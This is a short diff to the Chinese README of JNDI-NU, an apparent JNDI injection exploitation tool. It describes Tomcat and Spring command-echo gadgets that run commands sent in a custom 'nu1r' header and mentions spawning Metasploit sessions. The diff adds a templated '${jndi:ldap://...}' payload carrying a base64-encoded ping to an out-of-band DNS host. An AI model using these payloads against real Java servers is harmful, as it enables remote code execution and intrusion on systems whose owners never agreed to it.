@@ -21,6 +21,14 @@ Usage: java -jar JNDI-NU.jar [options]
     * ```TomcatEcho```: 用于在中间件为 ```Tomcat``` 时命令执行结果的回显，通过添加自定义```header``` ```nu1r: whoami```的方式传递想要执行的命令
     * ```SpringEcho```: 用于在框架为 ```SpringMVC/SpringBoot``` 时命令执行结果的回显，通过添加自定义```header``` ```nu1r: whoami``` 的方式传递想要执行的命令
     * ```nu1r```：用于执行命令，如果命令有特殊字符，支持对命令进行 Base64编码后传输
+```
+{{url
+  (${jndi:ldap://0.0.0.0:1389/TomcatBypass/nu1r/Base64/{{base64
+      (ping xxx.dnstunnel.run)
+  }}})
+}}
+```    
+
 
 - 支持tomcatBypass路由直接上线msf：
 
@@ -292,6 +300,7 @@ WF ：Write File - 通过 FileOutputStream.write() 来写入文件，使用命�
 }}
 ```
 
+* jb ：使用 ObjectInputStream/ObjectOutputStream 来构造序列化流
 
 
 ---
